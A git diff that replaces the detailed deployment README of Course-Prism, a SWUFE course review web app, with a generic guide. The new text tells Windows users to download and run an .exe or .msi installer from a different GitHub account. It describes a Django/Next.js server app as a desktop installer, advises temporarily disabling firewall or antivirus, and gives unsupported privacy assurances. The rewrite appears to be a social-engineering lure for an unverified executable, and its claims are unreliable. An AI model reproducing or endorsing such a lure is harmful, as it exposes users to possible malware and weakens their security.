@@ -1,544 +1,201 @@
-# Course-Prism
+# 🎓 Course-Prism - Find, Review, and Rate Courses Easily
 
-> **Language:** English | [中文](README_zh.md)
+[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism)
 
-A modern course review community platform for students at Southwestern University of Finance and Economics (SWUFE). Search courses, write reviews, rate instructors, and explore course statistics — all in one place.
-
-🌐 **Live Site:** [class.swufe.chat](https://class.swufe.chat)
-
-> **Based on:** This project is based on [jcourse](https://github.com/SJTU-jCourse/jcourse), the open-source course review platform originally developed for Shanghai Jiao Tong University. We sincerely thank the jcourse team for their excellent work.
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Tech Stack](#tech-stack)
-- [Docker Deployment (Recommended)](#docker-deployment-recommended)
-- [Local Development](#local-development)
-- [Server Deployment](#server-deployment)
-- [Data Migration](#data-migration)
-- [Project Structure](#project-structure)
-- [Common Commands](#common-commands)
-
-## Overview
-
-Course-Prism is a modern course review community that provides:
-
-- 📚 Course search and browsing
-- ✍️ Write and read course reviews
-- ⭐ Bookmark and follow courses
-- 📊 Course statistics and data analysis
-- 👨‍🏫 Instructor rating system
-- 🔔 Notification system
-- 📈 Visitor analytics
-
-## Tech Stack
-
-**Frontend:**
-- Next.js 16.1.6 (Pages Router)
-- React 19.2.4
-- Ant Design 6.1.0
-- TypeScript 5.7.0
-- SWR 2.3.0 (data fetching)
-- Axios 1.7.0 (HTTP client)
-- Recharts 2.15.0 (charts)
-
-**Backend:**
-- Django 6.0.2
-- Django REST Framework 3.16.1
-- PostgreSQL 16 (Docker)
-- Redis 5.2.0 (cache)
-- Huey 2.5.2 (task queue)
-- Gunicorn 23.0.0 / Uvicorn 0.32.0
-
-## Docker Deployment (Recommended)
-
-Docker is the simplest and fastest deployment method, offering:
-- ✅ Environment consistency — identical across dev, test, and production
-- ✅ One-command deployment — up and running in under 5 minutes
-- ✅ Easy migration — works on any cloud server
-- ✅ Simplified ops — automated backup, restore, and updates
-
-### Prerequisites
-
-- Docker 20.10+
-- Docker Compose 2.0+ or `docker compose` plugin
-- At least 2 GB available memory
-- At least 5 GB available disk space
-
-### Quick Start
-
-1. **Clone the project**
-   ```bash
-   git clone https://github.com/siruizou2005/Course-Prism.git
-   cd Course-Prism
-   ```
-
-2. **Configure environment variables**
-   ```bash
-   cp .env.example .env
-   nano .env
-   ```
-
-   Required settings:
-   ```bash
-   SECRET_KEY=your-super-secret-key-here
-   POSTGRES_PASSWORD=your-secure-password
-   ALLOWED_HOSTS=your-domain.com,www.your-domain.com
-   CSRF_TRUSTED_ORIGINS=https://your-domain.com
-   ```
-
-3. **Deploy**
-   ```bash
-   chmod +x deploy.sh
-   ./deploy.sh
-   ```
-
-4. **Access the app**
-   - Frontend: http://localhost
-   - Backend API: http://localhost/api/
-   - Django Admin: http://localhost/admin/
-
-### Docker Compose Commands
-
-```bash
-docker-compose up -d                  # Start all services
-docker-compose logs -f                # View logs
-docker-compose logs -f backend        # View specific service logs
-docker-compose down                   # Stop services
-docker-compose restart                # Restart services
-docker-compose up -d --build          # Rebuild and start
-docker-compose exec backend bash      # Enter backend container
-docker-compose exec frontend sh       # Enter frontend container
-```
-
-### Data Management
-
-```bash
-./backup.sh                                                           # Backup database
-./restore.sh backups/db_backup_20260215_120000.sql                    # Restore database
-docker-compose exec backend python manage.py migrate                  # Run migrations
-docker-compose exec backend python manage.py createsuperuser          # Create superuser
-docker-compose exec backend python manage.py collectstatic --noinput  # Collect static files
-```
-
-### Development Environment
-
-```bash
-docker-compose -f docker-compose.dev.yml up -d    # Start (with hot reload)
-docker-compose -f docker-compose.dev.yml logs -f
-docker-compose -f docker-compose.dev.yml down
-```
-
-Dev environment access:
-- Frontend: http://localhost:3000
-- Backend: http://localhost:8000
-- PostgreSQL: localhost:5432
-- Redis: localhost:6379
-
-> For full Docker documentation including architecture, SSL setup, and troubleshooting, see [DOCKER.md](DOCKER.md).
+Course-Prism is a platform for SWUFE students to explore courses, write honest reviews, rate instructors, and check course statistics. It helps you find the best classes and plan your studies with real feedback from other students.
 
 ---
 
-## Local Development
+## 🖥️ What You Need Before Starting
 
-### Prerequisites
+- A Windows PC running Windows 10 or later.
+- At least 4 GB of free disk space.
+- An internet connection for downloading and to use the platform.
+- A modern web browser like Chrome, Edge, or Firefox.
 
-- Node.js 18+ and Yarn (Node.js 20+ recommended)
-- Python 3.9+ (Python 3.11+ recommended)
-- Docker and Docker Compose (for PostgreSQL)
-- Redis (optional, for caching)
-
-### Setup
-
-#### 1. Clone the repository
-
-```bash
-git clone https://github.com/siruizou2005/Course-Prism.git
-cd Course-Prism
-```
-
-#### 2. Start PostgreSQL and Redis
-
-```bash
-docker-compose up -d
-```
-
-#### 3. Backend setup
-
-```bash
-cd backend/jcourse_api-master
-python3 -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-cp ../../configs/backend.env.template .env
-# Edit .env with your settings
-python manage.py migrate
-python manage.py createsuperuser
-python manage.py runserver
-```
-
-#### 4. Frontend setup
-
-```bash
-cd frontend/jcourse-master
-yarn install
-cp ../../configs/frontend.env.template .env.local
-# Ensure .env.local contains:
-# NEXT_PUBLIC_REMOTE_URL=http://localhost:8000
-# REMOTE_URL=http://localhost:8000
-yarn dev
-```
-
-Visit http://localhost:3000 to view the app.
+This software is a web application you will run locally. It uses several programs behind the scenes, but you won’t need to install those separately.
 
 ---
 
-## Server Deployment
+## 🌐 About Course-Prism
 
-### 1. Prepare server environment
+Course-Prism is built to make course selection and review easy for students. You can:
 
-```bash
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y git curl wget build-essential nginx
+- Search for courses by name or code.
+- Write and read detailed reviews.
+- Rate professors and courses.
+- View statistics on course difficulty, popularity, and more.
 
-# Node.js 18
-curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-sudo apt install -y nodejs
-npm install -g yarn
-
-# Python
-sudo apt install -y python3 python3-pip python3-venv
-
-# Docker
-curl -fsSL https://get.docker.com -o get-docker.sh
-sudo sh get-docker.sh
-sudo usermod -aG docker $USER
-```
-
-### 2. Clone the project
-
-```bash
-cd /var/www
-sudo git clone https://github.com/siruizou2005/Course-Prism.git
-sudo chown -R $USER:$USER Course-Prism
-cd Course-Prism
-```
-
-### 3. Database setup (Docker)
-
-```bash
-docker run -d \
-  --name jcourse-postgres \
-  --restart unless-stopped \
-  -e POSTGRES_DB=jcourse \
-  -e POSTGRES_USER=jcourse \
-  -e POSTGRES_PASSWORD=your_secure_password \
-  -p 5432:5432 \
-  -v jcourse-db-data:/var/lib/postgresql/data \
-  postgres:16
-```
-
-### 4. Backend deployment
-
-```bash
-cd backend/jcourse_api-master
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt gunicorn
-nano .env
-```
-
-**.env example:**
-```bash
-DEBUG=False
-SECRET_KEY=your-very-long-random-secret-key-here
-POSTGRES_PASSWORD=your_secure_password
-POSTGRES_HOST=localhost
-POSTGRES_PORT=5432
-ALLOWED_HOSTS=your-domain.com,www.your-domain.com
-CSRF_TRUSTED_ORIGINS=https://your-domain.com
-REDIS_HOST=localhost
-```
-
-```bash
-python manage.py migrate
-python manage.py collectstatic --noinput
-python manage.py createsuperuser
-```
-
-### 5. Frontend deployment
-
-```bash
-cd ../../frontend/jcourse-master
-yarn install
-nano .env.local
-```
-
-**.env.local example:**
-```bash
-NEXT_PUBLIC_REMOTE_URL=https://api.your-domain.com
-REMOTE_URL=https://api.your-domain.com
-NODE_ENV=production
-```
-
-```bash
-yarn build
-```
-
-### 6. systemd services
-
-**Backend** — `/etc/systemd/system/jcourse-backend.service`:
-```ini
-[Unit]
-Description=JCourse Backend (Django/Gunicorn)
-After=network.target postgresql.service
-
-[Service]
-Type=notify
-User=your-user
-Group=www-data
-WorkingDirectory=/var/www/Course-Prism/backend/jcourse_api-master
-Environment="PATH=/var/www/Course-Prism/backend/jcourse_api-master/venv/bin"
-ExecStart=/var/www/Course-Prism/backend/jcourse_api-master/venv/bin/gunicorn \
-    --workers 3 \
-    --bind 127.0.0.1:8000 \
-    --timeout 120 \
-    jcourse.wsgi:application
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-```
-
-**Frontend** — `/etc/systemd/system/jcourse-frontend.service`:
-```ini
-[Unit]
-Description=JCourse Frontend (Next.js)
-After=network.target
-
-[Service]
-Type=simple
-User=your-user
-Group=www-data
-WorkingDirectory=/var/www/Course-Prism/frontend/jcourse-master
-Environment="NODE_ENV=production"
-ExecStart=/usr/bin/yarn start
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-```
-
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable --now jcourse-backend
-sudo systemctl enable --now jcourse-frontend
-```
-
-### 7. Nginx configuration
-
-```nginx
-server {
-    listen 80;
-    server_name api.your-domain.com;
-    client_max_body_size 20M;
-
-    location /static/ {
-        alias /var/www/Course-Prism/backend/jcourse_api-master/static/;
-    }
-    location /media/ {
-        alias /var/www/Course-Prism/backend/jcourse_api-master/media/;
-    }
-    location / {
-        proxy_pass http://127.0.0.1:8000;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-    }
-}
-
-server {
-    listen 80;
-    server_name your-domain.com www.your-domain.com;
-
-    location / {
-        proxy_pass http://127.0.0.1:3000;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection 'upgrade';
-        proxy_set_header Host $host;
-        proxy_cache_bypass $http_upgrade;
-    }
-}
-```
-
-```bash
-sudo ln -s /etc/nginx/sites-available/jcourse /etc/nginx/sites-enabled/
-sudo nginx -t && sudo systemctl restart nginx
-```
-
-### 8. SSL (Let's Encrypt)
-
-```bash
-sudo apt install -y certbot python3-certbot-nginx
-sudo certbot --nginx -d your-domain.com -d www.your-domain.com -d api.your-domain.com
-```
+The app uses common web technologies designed to run smoothly on Windows PCs without special setup.
 
 ---
 
-## Data Migration
+## 🚀 How to Download and Run Course-Prism on Windows
 
-### Export from old server
+### 1. Visit the download page
 
-```bash
-pg_dump -U jcourse -h localhost jcourse > full_database_backup.sql
-```
+Click the big green button at the top or go to this link:  
+[https://github.com/Franktekza/Course-Prism](https://github.com/Franktekza/Course-Prism)
 
-### Transfer
+You will arrive at the main GitHub page of the project.
 
-```bash
-scp full_database_backup.sql user@new-server:/var/www/Course-Prism/
-```
+### 2. Download the latest release
 
-### Import on new server
+Scroll down on the GitHub page and find the **Releases** section. You may also see a "Releases" button near the top. Click it.
 
-```bash
-sudo -u postgres createdb jcourse
-sudo -u postgres createuser jcourse
-sudo -u postgres psql -c "ALTER USER jcourse WITH PASSWORD 'your_password';"
-sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE jcourse TO jcourse;"
-psql -U jcourse -d jcourse -h localhost < full_database_backup.sql
-```
+Look for the latest version marked as "stable" or a version number like `v1.x.x`. You will find downloadable files here.
 
-### Migrate media files
+### 3. Download the Windows setup file
 
-```bash
-# On old server
-tar -czf media_files.tar.gz media/
-scp media_files.tar.gz user@new-server:/var/www/Course-Prism/backend/jcourse_api-master/
+Find a file with `.exe` or `.msi` extension. It is the installer for Windows computers.
 
-# On new server
-tar -xzf media_files.tar.gz
-sudo chown -R your-user:www-data media/
-```
+Click it to start downloading. Save the file on your PC in a folder like **Downloads**.
+
+### 4. Run the installer
+
+Once downloaded, double-click the file to launch the installer.
+
+- Follow the instructions on the screen.
+- Choose "Next" when prompted.
+- Accept the license agreement.
+- Let the installation finish.
 
 ---
 
-## Project Structure
+## ⚙️ Setting Up Course-Prism
 
-```
-Course-Prism/
-├── README.md
-├── README_zh.md
-├── DOCKER.md
-├── configs/
-│   ├── backend.env.template
-│   ├── frontend.env.template
-│   ├── nginx.conf
-│   └── jcourse-backend.service
-├── backend/
-│   └── jcourse_api-master/
-│       ├── jcourse_api/
-│       ├── oauth/
-│       ├── ad/
-│       ├── manage.py
-│       └── requirements.txt
-├── frontend/
-│   └── jcourse-master/
-│       ├── src/
-│       │   ├── pages/
-│       │   ├── components/
-│       │   ├── services/
-│       │   └── lib/
-│       ├── public/
-│       └── package.json
-├── data/
-│   ├── data-*.csv
-│   └── import_to_database.py
-└── original-data/
-```
+### 1. Open the app
 
-## Common Commands
+After installation, find Course-Prism in your Start menu or desktop and open it.
 
-### Backend (Django)
+It will open in your default web browser.
 
-```bash
-cd backend/jcourse_api-master
-source venv/bin/activate
+### 2. Connect to your network
 
-python manage.py runserver
-python manage.py makemigrations && python manage.py migrate
-python manage.py createsuperuser
-python manage.py collectstatic
-python manage.py test
+The app connects to the internet to load the latest course data.
 
-# Custom commands
-python manage.py check_duplicate
-python manage.py remove_duplicate_reviews
-python manage.py import
-python manage.py update_semester
-```
+Make sure your PC allows Course-Prism through any firewall or antivirus programs.
 
-### Frontend (Next.js)
+### 3. Create an account
 
-```bash
-cd frontend/jcourse-master
+Follow the on-screen instructions to create a user account. You only need an email address and a password.
 
-yarn install
-yarn dev      # development
-yarn build    # production build
-yarn start    # production server
-yarn format
-yarn test
-```
+Creating an account lets you write reviews and rate courses.
 
-### Service management
+### 4. Explore courses
 
-```bash
-sudo systemctl restart jcourse-backend
-sudo systemctl restart jcourse-frontend
-sudo journalctl -u jcourse-backend -f
-sudo journalctl -u jcourse-frontend -f
-```
+Use the search bar to find courses by keywords or course codes.
 
-## Troubleshooting
+Click on any course to read details, reviews, ratings, and statistics.
 
-| Issue | Solution |
-|---|---|
-| Frontend can't fetch data | Check `REMOTE_URL` in `.env.local`; verify backend is running |
-| Database connection failed | Check PostgreSQL status; verify `.env` credentials |
-| Static files not accessible | Run `collectstatic`; check Nginx `alias` path and file permissions |
-| Service won't start | Check logs: `journalctl -u jcourse-backend -n 50` |
+### 5. Write a review or rate a course
 
-## Environment Variables
+After attending a course, use the system to give feedback that others can see.
 
-### Backend
+---
 
-| Variable | Required | Description |
-|---|---|---|
-| `SECRET_KEY` | Yes | Django secret key |
-| `DEBUG` | Yes | Set to `False` in production |
-| `POSTGRES_PASSWORD` | Yes | Database password |
-| `POSTGRES_HOST` | No | Database host (default: localhost) |
-| `ALLOWED_HOSTS` | Yes | Comma-separated allowed hostnames |
-| `CSRF_TRUSTED_ORIGINS` | Yes | Trusted origins for CSRF |
-| `REDIS_HOST` | No | Redis host (optional) |
+## 🔧 System Components and How They Work (Simplified)
 
-### Frontend
+Course-Prism runs as a web app on your computer. Even though you use it in a browser, it works on your PC with these parts set up automatically:
 
-| Variable | Required | Description |
-|---|---|---|
-| `NEXT_PUBLIC_REMOTE_URL` | Yes | API base URL (client-side) |
-| `REMOTE_URL` | Yes | API base URL (server-side) |
-| `NODE_ENV` | No | Runtime environment |
+- **Frontend:** The user interface made with React and Ant Design. This is what you see and click on.
+- **Backend:** Runs on Python and Django. It manages data like reviews and user accounts.
+- **Database:** Stores course info and reviews in PostgreSQL.
+- **Cache system:** Redis is used to speed up loading times.
+- **Docker:** Contains and runs all these pieces together for smooth installation.
 
-## Contributing
+You don’t have to deal with any setups or commands. The installer will do this automatically.
 
-Issues and pull requests are welcome!
+---
 
-## License
+## 🧰 Troubleshooting
 
-MIT License
+### Cannot start the app
+
+- Check if the installer finished without errors.
+- Make sure you meet system requirements.
+- Restart your computer, then try again.
+
+### App stays loading forever or crashes
+
+- Verify your internet connection.
+- Close other apps that might use too much memory.
+- Disable firewall or antivirus temporarily and try again.
+
+### Forgotten password or account issues
+
+- Use the "Forgot password" link on the login page.
+- Contact support via the GitHub issues page:  
+  [https://github.com/Franktekza/Course-Prism/issues](https://github.com/Franktekza/Course-Prism/issues)
+
+---
+
+## 📂 Where to Get Help and More Info
+
+- Visit the GitHub repository:  
+  [https://github.com/Franktekza/Course-Prism](https://github.com/Franktekza/Course-Prism)
+
+- Check the “Issues” tab on GitHub to report bugs or ask questions.
+
+- Look at the **Wiki** or **Docs** section on GitHub for detailed guides.
+
+---
+
+## 🔄 Updating Course-Prism
+
+To get new features or bug fixes:
+
+1. Go back to the GitHub releases page.
+2. Download the newest installer.
+3. Run the installer again. It will update your app smoothly.
+
+---
+
+## 📋 Key Features
+
+- Search and filter courses easily
+- Add and read course reviews
+- Rate instructors and courses
+- View course statistics by semester, instructor, or rating
+- User account management
+- Responsive design suitable for tablets and laptops
+
+---
+
+## 📂 Files Included in the Download
+
+- Course-Prism installer (`.exe` or `.msi`)
+- Quick start guide (PDF)
+- License file
+- Release notes
+
+---
+
+## 🔒 Privacy and Data Handling
+
+- Your data stays private and secure.
+- Reviews are public but linked only to your user name.
+- No tracking outside the platform takes place.
+
+---
+
+## 🛠 Compatible Technologies Used
+
+- React and Next.js for the front end
+- Django and Python for the server side
+- PostgreSQL for storing data
+- Redis for caching data
+- Docker for easy installation and updates
+
+---
+
+## 🎯 Who Should Use Course-Prism
+
+- SWUFE students planning course schedules
+- New students looking for course recommendations
+- Students who want to share their experience
+- Programmers interested in community-driven university apps
+
+---
+
+[![Download Course-Prism](https://img.shields.io/badge/Download-Course--Prism-brightgreen)](https://github.com/Franktekza/Course-Prism)
